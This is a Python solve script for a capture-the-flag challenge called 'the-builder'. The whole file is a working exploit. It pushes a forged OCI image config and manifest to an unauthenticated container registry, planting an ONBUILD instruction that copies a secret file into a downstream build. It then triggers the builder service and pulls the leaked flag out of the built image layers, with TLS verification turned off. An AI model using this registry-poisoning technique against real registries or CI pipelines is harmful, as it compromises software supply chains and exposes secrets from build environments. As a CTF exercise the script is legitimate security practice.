#!/usr/bin/env python3

from __future__ import annotations

import gzip
import hashlib
import io
import json
import tarfile
from pathlib import Path

import requests
from pwn import args, log

BASE_DIR = Path(__file__).resolve().parent
REGISTRY = args.REGISTRY or "https://the-builder-registry-9690a65fc55e.chall.nnsc.tf"
BUILDER = args.BUILDER or "https://the-builder-9690a65fc55e.chall.nnsc.tf"
CONTENT = "ONBUILD_COPY_FLAG"


def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def tag_for_content(content: str) -> str:
    return sha256_hex(content.encode())[:12]


def session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    return s


def upload_blob(s: requests.Session, repo: str, blob: bytes, digest: str) -> None:
    r = s.post(f"{REGISTRY}/v2/{repo}/blobs/uploads/")
    r.raise_for_status()
    location = r.headers["Location"]
    sep = "&" if "?" in location else "?"
    r = s.put(
        f"{location}{sep}digest={digest}",
        data=blob,
        headers={"Content-Type": "application/octet-stream"},
    )
    r.raise_for_status()


def poison_pages_repo(s: requests.Session) -> str:
    tag = tag_for_content(CONTENT)
    config = json.dumps(
        {
            "architecture": "amd64",
            "os": "linux",
            "config": {"OnBuild": ["COPY --from=theme /flag.txt /page"]},
            "rootfs": {"type": "layers", "diff_ids": []},
            "history": [{"created_by": "the-builder exploit"}],
        },
        separators=(",", ":"),
    ).encode()
    config_digest = f"sha256:{sha256_hex(config)}"
    manifest = json.dumps(
        {
            "schemaVersion": 2,
            "mediaType": "application/vnd.oci.image.manifest.v1+json",
            "config": {
                "mediaType": "application/vnd.oci.image.config.v1+json",
                "digest": config_digest,
                "size": len(config),
            },
            "layers": [],
        },
        separators=(",", ":"),
    ).encode()

    log.info("poisoning pages:%s with ONBUILD payload", tag)
    upload_blob(s, "pages", config, config_digest)
    r = s.put(
        f"{REGISTRY}/v2/pages/manifests/{tag}",
        data=manifest,
        headers={"Content-Type": "application/vnd.oci.image.manifest.v1+json"},
    )
    r.raise_for_status()
    return tag


def trigger_build(s: requests.Session) -> str:
    r = s.post(
        f"{BUILDER}/api/builds",
        data=[("location", "index.html"), ("content", CONTENT)],
    )
    r.raise_for_status()
    build_id = r.json()["id"]
    log.info("build id: %s", build_id)
    return build_id


def fetch_manifest(s: requests.Session, build_id: str) -> dict:
    r = s.get(
        f"{REGISTRY}/v2/sites/{build_id}/manifests/latest",
        headers={"Accept": "application/vnd.docker.distribution.manifest.v2+json"},
    )
    r.raise_for_status()
    return r.json()


def extract_flag_from_layer(s: requests.Session, build_id: str, digest: str) -> str | None:
    r = s.get(f"{REGISTRY}/v2/sites/{build_id}/blobs/{digest}")
    r.raise_for_status()
    with tarfile.open(fileobj=io.BytesIO(gzip.decompress(r.content))) as tf:
        for name in ("var/lib/nginx/html/index.html", "usr/share/nginx/html/index.html"):
            try:
                member = tf.getmember(name)
            except KeyError:
                continue
            data = tf.extractfile(member).read().decode()
            if "NNS{" in data:
                return data.strip()
    return None


def exploit() -> str:
    s = session()
    poison_pages_repo(s)
    build_id = trigger_build(s)
    manifest = fetch_manifest(s, build_id)
    for layer in reversed(manifest["layers"]):
        flag = extract_flag_from_layer(s, build_id, layer["digest"])
        if flag:
            return flag
    raise RuntimeError("flag not found in any final image layer")


def main() -> None:
    flag = exploit()
    log.success("flag: %s", flag)
    print(f"<FLAG>{flag}</FLAG>")


if __name__ == "__main__":
    main()
